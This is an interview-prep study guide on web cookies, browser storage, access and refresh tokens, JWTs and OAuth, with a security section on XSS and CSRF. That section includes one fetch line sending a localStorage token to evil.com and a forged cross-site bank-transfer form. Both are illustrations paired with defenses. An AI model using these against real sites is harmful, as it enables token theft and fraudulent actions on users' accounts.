# Web Cookies, Sessions, Access Tokens, Refresh Tokens

This document summarizes interview knowledge around web cookies, browser
storage, sessions, access tokens, refresh tokens, JWTs, and the security issues
that connect them.

You should be able to answer questions such as:

- What is a cookie, and when does the browser send it?
- What do `HttpOnly`, `Secure`, and `SameSite` mean?
- How are cookies different from `localStorage`?
- What is the difference between a session cookie and a persistent cookie?
- Where should access tokens and refresh tokens be stored?
- How do XSS and CSRF affect cookies and tokens?
- What are third-party cookies, and why are browsers restricting them?

---

## 1. What Is A Cookie?

A cookie is a small key-value record that a server asks the browser to store.
After that, the browser automatically sends the cookie on matching HTTP
requests.

The server sets a cookie using a response header:

```http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

The browser sends it back using a request header:

```http
GET /account HTTP/1.1
Host: example.com
Cookie: session_id=abc123
```

Key points:

- Cookies are scoped by domain, path, scheme, and security attributes.
- Browsers attach cookies automatically when a request matches the cookie rules.
- JavaScript can read cookies through `document.cookie` unless the cookie is
  marked `HttpOnly`.
- Cookies are commonly used for login sessions, tracking, preferences, and A/B
  testing.

Interview answer:

> A cookie is browser-managed per-site storage. The server sets it through
> `Set-Cookie`, and the browser sends it back through the `Cookie` header when
> domain, path, scheme, and security rules match.

### 1.1 Who Defines Cookie Data?

Cookie data is defined by the website/server, not by the browser.

The browser does not decide what `session_id`, `theme`, `tracking_id`, or
`refresh_token` means. The server sends cookie data using `Set-Cookie`, and the
browser stores it as scoped metadata.

Example:

```http
Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure
Set-Cookie: theme=dark; Path=/; Max-Age=31536000
```

Here:

- `session_id` and `theme` are names chosen by the website.
- `abc123` and `dark` are values chosen by the website.
- `Path`, `HttpOnly`, `Secure`, and `Max-Age` are cookie attributes that tell the
  browser how to store and send the cookie.

The browser's job is to:

- store the cookie,
- enforce domain/path/security rules,
- attach matching cookies to later requests,
- hide `HttpOnly` cookies from JavaScript,
- expire/delete cookies according to policy.

The website's job is to:

- choose cookie names and values,
- define what those values mean,
- validate cookie values on the server,
- decide session/token lifetime and rotation policy.

Interview answer:

> Cookie values are application-defined. The browser does not understand the
> meaning of `session_id=abc123`; it only stores it with metadata and sends it
> back when the request matches the cookie scope and security rules.

### 1.2 Are Cookies Different For Different URLs?

Yes. Cookie data can be different for different sites, domains, subdomains, and
paths.

For example:

```text
https://shop.com        -> Cookie: cart_id=aaa
https://bank.com        -> Cookie: session_id=bbb
https://api.shop.com    -> may receive different cookies depending on Domain
https://shop.com/admin  -> may receive cookies scoped to Path=/admin
```

Cookies are not globally shared across all URLs. A cookie belongs to a scope.
That scope is controlled mainly by:

- `Domain`
- `Path`
- `Secure`
- `SameSite`
- partitioning/privacy policy

Example:

```http
Set-Cookie: admin_token=xyz; Path=/admin; Secure; HttpOnly
```

This cookie is sent to:

```text
https://example.com/admin
https://example.com/admin/settings
```

but not normally sent to:

```text
https://example.com/public
https://other.com/admin
```

Important distinction:

- Different websites usually have different cookies.
- Different paths on the same website can also receive different cookies.
- Subdomains may or may not share cookies depending on the `Domain` attribute.
- The browser enforces the scope, but the website defines the cookie content.

---

## 2. Cookie Flow During Login

A common server-side session flow:

```text
User submits login form
  |
  v
POST /login
  |
  v
Server validates username/password
  |
  v
Server creates session in DB/cache
  |
  v
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax
  |
  v
Browser stores cookie
  |
  v
Later request: GET /profile
  |
  v
Cookie: session_id=abc123
  |
  v
Server looks up session_id
```

The cookie does not need to contain all user data. In a classic server-side
session, the cookie only stores a session identifier, while the actual session
state lives on the server.

---

## 3. Cookie Attributes

### 3.1 `HttpOnly`

```http
Set-Cookie: session_id=abc123; HttpOnly
```

`HttpOnly` prevents JavaScript from reading the cookie through
`document.cookie`.

What it helps with:

- Reduces token/session theft when XSS exists.
- The cookie is still automatically included in matching HTTP requests.

What it does not prevent:

- XSS can still perform actions as the user because the browser still sends the
  cookie automatically.

Interview answer:

> `HttpOnly` does not make a cookie absolutely safe. It only prevents JavaScript
> from reading the cookie. If a page has XSS, attacker-controlled JavaScript may
> still call APIs as the user because the browser will attach the cookie.

### 3.2 `Secure`

```http
Set-Cookie: session_id=abc123; Secure
```

`Secure` means the browser only sends the cookie over HTTPS.

What it helps with:

- Prevents sending the cookie over plaintext HTTP.
- Reduces sniffing and man-in-the-middle risk on the network.

Best practice: authentication cookies should always use `Secure`.

### 3.3 `SameSite`

`SameSite` controls whether the browser sends a cookie in cross-site requests.

| Mode | Meaning |
| --- | --- |
| `Strict` | Sent only for same-site requests. Safest, but can affect UX. |
| `Lax` | Sent for same-site requests and top-level cross-site GET navigation. Modern default behavior. |
| `None` | Allows cross-site cookie usage, but must be paired with `Secure`. |

Example:

```http
Set-Cookie: session_id=abc123; SameSite=Lax; Secure; HttpOnly
```

CSRF relevance:

- `SameSite=Lax` or `Strict` greatly reduces CSRF risk.
- `SameSite=None` usually needs a CSRF token or another CSRF defense.

### 3.4 `Domain`

```http
Set-Cookie: id=1; Domain=example.com
```

The cookie may be sent to matching subdomains:

```text
www.example.com
api.example.com
```

If `Domain` is not set, the cookie is host-only and is only sent to the exact
host that set it.

Security note:

- A broader domain is convenient but increases blast radius.
- A compromised subdomain can become more dangerous if cookies are scoped too
  broadly.

### 3.5 `Path`

```http
Set-Cookie: pref=dark; Path=/settings
```

The cookie is sent only when the request path matches the prefix.

Examples:

```text
/settings
/settings/profile
```

`Path` is not a strong security boundary. Do not rely on it to protect secrets
from code running in the same origin.

### 3.6 `Expires` And `Max-Age`

Session cookie:

```http
Set-Cookie: sid=abc; HttpOnly; Secure
```

No `Expires` or `Max-Age` means the cookie usually lives until the browser
session ends.

Persistent cookie:

```http
Set-Cookie: sid=abc; Max-Age=3600; HttpOnly; Secure
```

This cookie lives for 3600 seconds.

If both `Max-Age` and `Expires` are present, `Max-Age` generally takes
precedence.

---

## 4. First-Party, Third-Party, Same-Origin, Same-Site

### 4.1 Origin

An origin is:

```text
scheme + host + port
```

Example:

```text
https://example.com:443
```

These are different origins:

```text
https://example.com
https://api.example.com
http://example.com
https://example.com:8443
```

### 4.2 Site

A site is usually:

```text
scheme + registrable domain
```

For example:

```text
https://a.example.com
https://b.example.com
```

are same-site as `https://example.com`.

### 4.3 First-Party Cookie

A first-party cookie is used in the context of the site the user is directly
visiting.

If the user is on:

```text
https://shop.com
```

then requests to `shop.com` using `shop.com` cookies are first-party.

### 4.4 Third-Party Cookie

A third-party cookie is used in the context of another top-level site.

Example:

```html
<iframe src="https://ads.com/ad.html"></iframe>
```

If the user is on `news.com`, but the iframe loads `ads.com`, then `ads.com`
cookies are third-party in this context.

Common uses:

- Cross-site tracking.
- Ads attribution.
- Retargeting.
- Embedded login widgets.

Browser trend:

- Modern browsers increasingly restrict or partition third-party cookies.
- Brave, Safari, and Firefox have historically blocked or restricted them more
  aggressively than traditional Chrome defaults.

---

## 5. Cookie vs Web Storage

### 5.1 Cookie

Advantages:

- Automatically sent by the browser on matching requests.
- Supports `HttpOnly`, `Secure`, and `SameSite`.
- Good fit for server-side sessions.

Disadvantages:

- Sent with every matching request, adding overhead.
- Small size limit.
- If not protected by `SameSite` or CSRF defenses, cookie auth can be vulnerable
  to CSRF.

### 5.2 `localStorage`

Advantages:

- Easy to use from JavaScript.
- Larger than cookies.
- Not automatically sent with every request.

Disadvantages:

- JavaScript can read it.
- If XSS exists, an attacker can steal tokens stored there.
- No `HttpOnly` equivalent.

### 5.3 `sessionStorage`

Similar to `localStorage`, but lifetime is tied to a browser tab/session.

### 5.4 IndexedDB

Larger async browser storage, commonly used for offline data, cache, and app
state.

It is still readable by JavaScript, so it is not ideal for secrets if XSS is in
your threat model.

### 5.5 Quick Comparison

| Storage | JS-readable? | Auto-sent with requests? | Supports `HttpOnly`? | Use case |
| --- | --- | --- | --- | --- |
| Cookie | Yes, except `HttpOnly` | Yes | Yes | Session/auth, preferences |
| localStorage | Yes | No | No | Non-sensitive client state |
| sessionStorage | Yes | No | No | Per-tab temporary state |
| IndexedDB | Yes | No | No | Offline/cache/app data |

---

## 6. Access Token

An access token is a credential used to access an API.

Example:

```http
GET /api/me HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOi...
```

Access tokens are usually:

- Short-lived.
- Sent through `Authorization: Bearer`.
- Opaque tokens or JWTs.
- Used to represent permission to access resources.

### 6.1 JWT Access Token

A JWT has three parts:

```text
header.payload.signature
```

The payload often contains claims:

```json
{
  "sub": "user_123",
  "exp": 1730000000,
  "scope": "read:profile"
}
```

Important points:

- A normal JWT payload is base64url encoded, not encrypted.
- Do not store secrets in the JWT payload.
- The server verifies the signature to ensure the token was not modified.
- `exp` defines token expiration.

### 6.2 Where Should Access Tokens Be Stored?

There is no perfect answer. It is a trade-off.

Options:

1. **In memory**
   - Harder to steal than `localStorage` if XSS happens after reload.
   - Lost on page refresh.

2. **localStorage**
   - Easy to implement.
   - High risk under XSS because attacker JavaScript can read it.

3. **HttpOnly cookie**
   - JavaScript cannot read it.
   - Browser sends it automatically.
   - Needs CSRF protection with `SameSite`, CSRF tokens, or origin checks.

Common recommendation:

> For security-sensitive web apps, avoid storing long-lived tokens in
> `localStorage`. Prefer `HttpOnly; Secure; SameSite` cookies for sessions or
> refresh tokens, and keep access tokens short-lived, often in memory or managed
> server-side.

---

## 7. Refresh Token

A refresh token is used to obtain a new access token after the access token
expires.

Flow:

```text
Login
  |
  v
Server returns:
  - short-lived access token
  - long-lived refresh token
  |
  v
Access token is used for API calls
  |
  v
When access token expires:
  POST /refresh with refresh token
  |
  v
Server returns new access token
```

Refresh tokens are usually:

- Longer-lived than access tokens.
- More sensitive than access tokens.
- Rotated after use.
- Revocable by the server.

### 7.1 Refresh Token Rotation

On each refresh:

```text
old refresh token -> new access token + new refresh token
old refresh token becomes invalid
```

If an old token is reused, the server can detect potential token theft.

### 7.2 Where Should Refresh Tokens Be Stored?

For browser web apps, refresh tokens are often best stored in:

```http
HttpOnly; Secure; SameSite=Lax/Strict cookie
```

Why:

- JavaScript cannot read the refresh token.
- If XSS occurs, the attacker cannot directly steal the refresh token.
- The refresh endpoint still needs CSRF protection if the cookie is sent
  automatically.

Avoid storing long-lived refresh tokens in `localStorage` for security-sensitive
apps.

---

## 8. Session Cookie vs Token-Based Auth

### 8.1 Server-Side Session Cookie

The cookie contains a session id:

```text
session_id=abc123
```

The server stores session state:

```text
abc123 -> user_id=42, role=admin, expiry=...
```

Advantages:

- Easy to revoke.
- Small cookie.
- Server controls session state.

Disadvantages:

- Requires server-side storage.
- Scaling may require a shared session store or sticky sessions.

### 8.2 Stateless JWT

The token contains signed claims.

Advantages:

- Server may not need a session lookup for every request.
- Useful for microservices if verification keys are shared.

Disadvantages:

- Hard to revoke before expiration.
- Larger than a session id.
- Claims can become stale if user permissions change.

### 8.3 What Should You Choose?

Rule of thumb:

- Traditional web app: server-side session + `HttpOnly` cookie.
- SPA/API: short-lived access token + refresh token rotation.
- High-security web: `HttpOnly; Secure; SameSite` cookie, CSRF defense, short
  TTL, token/session rotation, and device/session management.

---

## 9. XSS, CSRF, And Token Theft

### 9.1 XSS

XSS means attacker-controlled JavaScript runs in your origin.

If a token is in `localStorage`:

```js
fetch("https://evil.com/steal?token=" + localStorage.getItem("access_token"));
```

If a cookie is `HttpOnly`, JavaScript cannot read it:

```js
document.cookie // does not show HttpOnly cookies
```

But XSS can still do this:

```js
fetch("/api/transfer", { method: "POST", body: "..." });
```

The browser will automatically send cookies, so the attacker can still perform
actions as the user.

Defenses:

- Output escaping.
- Content Security Policy (CSP).
- Avoid dangerous `innerHTML`.
- HTML sanitization.
- `HttpOnly` cookies.
- Short-lived tokens.

### 9.2 CSRF

CSRF means an attacker causes the user's browser to send a request to your site,
with cookies attached automatically.

Example: user is logged in to `bank.com`, then attacker page contains:

```html
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
```

If the browser sends the session cookie, the server may think the request is
legitimate.

Defenses:

- `SameSite=Lax` or `Strict`.
- CSRF tokens.
- Check `Origin` / `Referer`.
- Require a custom header for state-changing API calls.

### 9.3 Cookie Auth vs Bearer Token Security

Cookie auth:

- Good against token theft if `HttpOnly`.
- Needs CSRF defense.

Bearer token in `localStorage`:

- Not vulnerable to automatic CSRF by default because the browser does not attach
  it automatically.
- Vulnerable to XSS token theft.

Interview answer:

> Cookie and bearer token approaches shift risk. `HttpOnly` cookies reduce token
> theft from XSS but need CSRF protection. Bearer tokens in `localStorage` avoid
> automatic CSRF, but are easy to steal if XSS exists.

---

## 10. Browser Internals View

### 10.1 Where Do Cookies Live In Chromium?

Conceptually:

```text
Renderer
  |
  | fetch / image / script / navigation request
  v
Mojo URLLoaderFactory
  |
  v
Browser / Network Service
  |
  v
Cookie store / policy / SameSite / partitioning
  |
  v
HTTP request with Cookie header
```

The renderer should not independently decide every cookie that is sent. The
network stack and browser policy decide which cookies match the request and the
security context.

### 10.2 `document.cookie`

JavaScript calls:

```js
document.cookie
```

Blink exposes the DOM API, but actual cookie storage is tied to browser/network
storage. `HttpOnly` cookies are not exposed through this API.

### 10.3 Fetch With Credentials

```js
fetch("https://api.example.com/data", {
  credentials: "include"
});
```

Credentials modes:

- `omit`: do not send credentials.
- `same-origin`: send credentials for same-origin requests.
- `include`: send credentials even cross-origin if policy allows it.

CORS still decides whether JavaScript can read the response.

### 10.4 Cookie Partitioning

Modern privacy features increasingly partition cookies by top-level site.

Idea:

```text
top-level site + embedded third-party site -> separate cookie jar
```

Goal: reduce cross-site tracking.

Example:

```text
news.com embeds ads.com
shop.com embeds ads.com
```

`ads.com` cookies may be partitioned separately for `news.com` and `shop.com`.

---

## 11. OAuth/OIDC Simplified For Browsers

OAuth/OIDC often appears when discussing access tokens and refresh tokens.

Simplified authorization code flow:

```text
User clicks login
  |
  v
Redirect to identity provider
  |
  v
User authenticates
  |
  v
Redirect back with authorization code
  |
  v
Backend exchanges code for tokens
  |
  v
Backend creates session cookie or returns tokens
```

For browser apps, Authorization Code + PKCE is preferred over the old implicit
flow.

### 11.1 PKCE

PKCE adds:

```text
code_verifier
code_challenge = hash(code_verifier)
```

It protects public clients where a client secret cannot be safely stored.

---

## 12. Common Interview Questions

### Q1. How are cookies different from `localStorage`?

Answer:

> Cookies are automatically sent with matching requests and support security
> flags such as `HttpOnly`, `Secure`, and `SameSite`. `localStorage` is only
> accessed by JavaScript, is not automatically sent, and has no `HttpOnly`.
> Tokens in `localStorage` are easy to steal if XSS exists.

### Q2. Does `HttpOnly` protect against XSS?

Answer:

> It reduces XSS impact by preventing JavaScript from reading the cookie, but it
> does not stop XSS from calling APIs as the user. The browser still sends the
> cookie. You still need CSP, escaping, sanitization, and other XSS defenses.

### Q3. What does `SameSite=Lax` help with?

Answer:

> It reduces CSRF by preventing cookies from being sent in many cross-site
> subresource or POST requests. However, top-level cross-site GET navigation can
> still include cookies. Sensitive actions should still use CSRF tokens or
> origin checks.

### Q4. What is the difference between an access token and a refresh token?

Answer:

> An access token is short-lived and used to call APIs. A refresh token is
> longer-lived and used to obtain new access tokens. Refresh tokens are more
> sensitive and should use strong storage, rotation, and revocation.

### Q5. Why should refresh tokens not be stored in `localStorage`?

Answer:

> `localStorage` is readable by JavaScript. If XSS exists, an attacker can steal
> the long-lived refresh token and maintain access. Refresh tokens should be
> better protected, often with `HttpOnly; Secure; SameSite` cookies.

### Q6. Is JWT encrypted?

Answer:

> A normal JWT is signed, not encrypted. The payload is only base64url encoded,
> so anyone with the token can read the claims. Do not store secrets in a normal
> JWT payload.

### Q7. What is a third-party cookie?

Answer:

> A third-party cookie is a cookie from a domain different from the current
> top-level site, for example `ads.com` cookies while the user is on `news.com`.
> It is commonly used for tracking and ads attribution, so browser privacy
> features increasingly block or partition it.

### Q8. How do cookies work with CORS?

Answer:

> Cross-origin `fetch` must use `credentials: "include"` if it wants to send
> cookies. The server must return compatible CORS headers such as
> `Access-Control-Allow-Credentials: true` and an explicit
> `Access-Control-Allow-Origin`; wildcard origin is not allowed for credentialed
> responses.

---

## 13. Quick Cheat Sheet

```text
Cookie:
  Set-Cookie response header
  Cookie request header
  Auto-sent by browser

Security flags:
  HttpOnly = JS cannot read
  Secure = HTTPS only
  SameSite = cross-site sending policy
  Domain/Path = scope
  Max-Age/Expires = lifetime

Storage:
  Cookie = auto request + security flags
  localStorage = JS-readable, no HttpOnly
  sessionStorage = temporary per-tab storage
  IndexedDB = large JS-readable storage

Tokens:
  Access token = short-lived API credential
  Refresh token = long-lived token to get new access token
  JWT = signed claims, not encrypted by default

Threats:
  XSS steals JS-readable tokens
  CSRF abuses auto-sent cookies

Common secure setup:
  session/refresh cookie:
    HttpOnly; Secure; SameSite=Lax/Strict
  access token:
    short-lived, often in memory or server-managed session
  plus:
    CSRF token / Origin check / CSP / XSS prevention
```

